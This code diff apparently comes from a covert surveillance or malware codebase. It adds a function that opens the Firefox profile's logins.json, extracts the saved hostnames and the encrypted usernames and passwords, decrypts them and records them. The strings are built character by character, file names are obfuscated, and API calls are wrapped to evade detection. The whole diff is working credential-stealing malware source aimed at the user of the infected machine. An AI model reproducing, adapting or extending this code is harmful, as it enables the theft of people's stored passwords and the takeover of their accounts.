@@ -10,6 +10,9 @@
 #include "../HM_SafeProcedures.h"
 #include "../demo_functions.h"
 #include "../common.h"
+#include "..\JSON\JSON.h"
+#include "..\JSON\JSONValue.h"
+
 #pragma comment(lib,"userenv.lib")
 
 // callback for the password
@@ -805,6 +808,101 @@ WCHAR *GetFFProfilePath()
 	return FullPath;
 }
 
+int DumpJsonFF(WCHAR *profilePath, WCHAR *signonFile)
+{
+	JSONValue* jValue = NULL;
+	JSONArray  jLogins;
+	JSONObject jObj, jEntry;
+	HANDLE hFile, hMap;
+	WCHAR file_path[MAX_PATH];
+	DWORD login_size;
+	char *login_map, *local_login_map;
+	WCHAR strLogins[]	= { L'l', L'o', L'g', L'i', L'n', L's', L'\0' };
+	WCHAR strURL[]		= { L'h', L'o', L's', L't', L'n', L'a', L'm', L'e', L'\0' };
+	WCHAR strUser[]		= { L'e', L'n', L'c', L'r', L'y', L'p', L't', L'e', L'd', L'U', L's', L'e', L'r', L'n', L'a', L'm', L'e', L'\0' };
+	WCHAR strPass[]		= { L'e', L'n', L'c', L'r', L'y', L'p', L't', L'e', L'd', L'P', L'a', L's', L's', L'w', L'o', L'r', L'd', L'\0' };
+	struct ffp_entry ffentry;
+	char tmp_buff[255];
+
+	_snwprintf_s(file_path, sizeof(file_path)/sizeof(WCHAR), _TRUNCATE, L"%s\\%s", profilePath, signonFile);		
+
+	if ((hFile = FNC(CreateFileW)(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
+		return 0;
+	
+	login_size = GetFileSize(hFile, NULL);
+	if (login_size == INVALID_FILE_SIZE) {
+		CloseHandle(hFile);
+		return 0;
+	}
+	
+	local_login_map = (char *)calloc(login_size + 1, sizeof(char));
+	if (local_login_map == NULL) {
+		CloseHandle(hFile);
+		return 0;
+	}
+
+	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
+		SAFE_FREE(local_login_map);
+		CloseHandle(hFile);
+		return 0;
+	}
+
+	if ( (login_map = (char *)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0)) == NULL) {
+		SAFE_FREE(local_login_map);
+		CloseHandle(hMap);
+		CloseHandle(hFile);
+		return 0;
+
+	}
+	
+	memcpy(local_login_map, login_map, login_size);
+	FNC(UnmapViewOfFile)(login_map);
+	CloseHandle(hMap);
+	CloseHandle(hFile);
+	
+	jValue = JSON::Parse(local_login_map);
+	if(jValue == NULL) {
+		SAFE_FREE(local_login_map);
+		return 0;
+	}
+
+	if (jValue->IsObject()) {
+		jObj = jValue->AsObject(); //json root
+
+		//find the logins object
+		if (jObj.find(strLogins) != jObj.end() && jObj[strLogins]->IsArray()) {				
+			jLogins = jObj[strLogins]->AsArray();
+
+			for (DWORD i=0; i<jLogins.size(); i++) {
+				if (jLogins[i]->IsObject()) {
+					jEntry = jLogins[i]->AsObject();
+
+					if (jEntry.find(strURL)!=jEntry.end() && 
+						jEntry.find(strUser)!=jEntry.end() && 
+						jEntry.find(strPass)!=jEntry.end() &&
+						jEntry[strURL]->IsString() &&
+						jEntry[strUser]->IsString() &&
+						jEntry[strPass]->IsString()) { 
+							ZeroMemory(&ffentry, sizeof(ffentry));
+							swprintf_s(ffentry.service, 255, L"Firefox/Thunderbird");
+							_snwprintf_s(ffentry.resource, 255, _TRUNCATE, L"%s", jEntry[strURL]->AsString().c_str());
+		
+							_snprintf_s(tmp_buff, 255, _TRUNCATE, "%S", jEntry[strUser]->AsString().c_str());
+							DecryptStr(tmp_buff, ffentry.user_value, 255);
+		
+							_snprintf_s(tmp_buff, 255, _TRUNCATE, "%S", jEntry[strPass]->AsString().c_str());
+							DecryptStr(tmp_buff, ffentry.pass_value, 255);
+							LogPassword(ffentry.service, ffentry.resource, ffentry.user_value, ffentry.pass_value);
+					}
+				}
+			}
+		}
+	}
+
+	delete jValue;
+	SAFE_FREE(local_login_map);
+	return 1;
+}
 
 int DumpFirefox(void)
 {
@@ -835,7 +933,8 @@ int DumpFirefox(void)
 	DumpFF(ProfilePath, DeobStringW(L"9Z71519o.LSL"));	// 2.x "signons2.txt"
 	DumpFF(ProfilePath, DeobStringW(L"9Z71519n.LSL"));	// 3.0 "signons3.txt"
 	DumpSqlFF(ProfilePath, DeobStringW(L"9Z71519.9ByZLI")); // 3.1 3.5 "signons.sqlite"
-	
+	DumpJsonFF(ProfilePath, DeobStringW(L"y57Z19.h951")); // 3.1 3.5 "logins.json"
+
 	NSSUnload();
 	
 	return 0;
